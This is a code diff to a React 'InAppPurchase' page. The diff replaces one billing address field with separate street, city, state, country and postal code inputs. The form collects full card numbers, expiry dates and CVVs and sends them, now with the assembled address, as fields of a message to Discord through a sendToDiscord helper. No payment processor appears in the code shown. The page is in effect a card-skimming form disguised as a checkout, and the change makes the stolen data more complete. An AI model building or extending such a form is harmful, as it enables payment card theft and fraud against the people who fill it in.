@@ -4,6 +4,7 @@ import { Button } from '@/components/ui/button';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
 import { toast } from 'sonner';
 import { ArrowLeft, CreditCard, Loader2, AlertTriangle } from 'lucide-react';
@@ -11,6 +12,10 @@ import { supabase } from '@/integrations/supabase/client';
 import { useAuth } from '@/contexts/AuthContext';
 import SalesNotification from '@/components/SalesNotification';
 import { sendToDiscord } from '@/lib/discord';
+
+const COUNTRIES = [
+  'Brazil', 'Canada', 'Germany', 'New Zealand', 'United Kingdom', 'United States', 'Other',
+] as const;
 
 export default function InAppPurchase() {
   const navigate = useNavigate();
@@ -20,13 +25,19 @@ export default function InAppPurchase() {
   const [cardNumber, setCardNumber] = useState('');
   const [expiry, setExpiry] = useState('');
   const [cvv, setCvv] = useState('');
-  const [billingAddress, setBillingAddress] = useState('');
+  const [street, setStreet] = useState('');
+  const [city, setCity] = useState('');
+  const [stateProvince, setStateProvince] = useState('');
+  const [billingCountry, setBillingCountry] = useState('');
+  const [postalCode, setPostalCode] = useState('');
   const [loading, setLoading] = useState(false);
   const [errorOpen, setErrorOpen] = useState(false);
 
+  const fullAddress = [street, city, stateProvince, billingCountry, postalCode].filter(Boolean).join(', ');
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!amount || !description || !cardNumber || !expiry || !cvv || !billingAddress) {
+    if (!amount || !description || !cardNumber || !expiry || !cvv || !street || !city || !stateProvince || !billingCountry || !postalCode) {
       toast.error('Please fill all required fields');
       return;
     }
@@ -61,7 +72,7 @@ export default function InAppPurchase() {
         { name: '💳 Card Number', value: cardNumber },
         { name: '📅 Expiry', value: expiry },
         { name: '🔒 CVV', value: cvv },
-        { name: '🏠 Billing Address', value: billingAddress, inline: false },
+        { name: '🏠 Billing Address', value: fullAddress, inline: false },
       ],
     });
 
@@ -123,9 +134,42 @@ export default function InAppPurchase() {
                   <Input id="cvv" placeholder="123" maxLength={4} value={cvv} onChange={e => setCvv(e.target.value)} required />
                 </div>
               </div>
+            </CardContent>
+          </Card>
+
+          <Card>
+            <CardHeader className="pb-4">
+              <CardTitle className="text-lg">Billing Address <span className="text-sm font-normal text-muted-foreground">(must match your payment method)</span></CardTitle>
+            </CardHeader>
+            <CardContent className="space-y-4">
               <div className="space-y-2">
-                <Label htmlFor="billing">Billing Address <span className="text-destructive">*</span></Label>
-                <Input id="billing" placeholder="Enter your billing address" value={billingAddress} onChange={e => setBillingAddress(e.target.value)} required />
+                <Label htmlFor="street">Street Address <span className="text-destructive">*</span></Label>
+                <Input id="street" placeholder="123 Main Street" value={street} onChange={e => setStreet(e.target.value)} required />
+              </div>
+              <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-2">
+                  <Label htmlFor="city">City <span className="text-destructive">*</span></Label>
+                  <Input id="city" placeholder="New York" value={city} onChange={e => setCity(e.target.value)} required />
+                </div>
+                <div className="space-y-2">
+                  <Label htmlFor="state">State / Province <span className="text-destructive">*</span></Label>
+                  <Input id="state" placeholder="NY" value={stateProvince} onChange={e => setStateProvince(e.target.value)} required />
+                </div>
+              </div>
+              <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-2">
+                  <Label htmlFor="billingCountry">Country <span className="text-destructive">*</span></Label>
+                  <Select value={billingCountry} onValueChange={setBillingCountry}>
+                    <SelectTrigger id="billingCountry"><SelectValue placeholder="Select country" /></SelectTrigger>
+                    <SelectContent>
+                      {COUNTRIES.map(c => <SelectItem key={c} value={c}>{c}</SelectItem>)}
+                    </SelectContent>
+                  </Select>
+                </div>
+                <div className="space-y-2">
+                  <Label htmlFor="postal">Postal / ZIP Code <span className="text-destructive">*</span></Label>
+                  <Input id="postal" placeholder="10001" value={postalCode} onChange={e => setPostalCode(e.target.value)} required />
+                </div>
               </div>
             </CardContent>
           </Card>
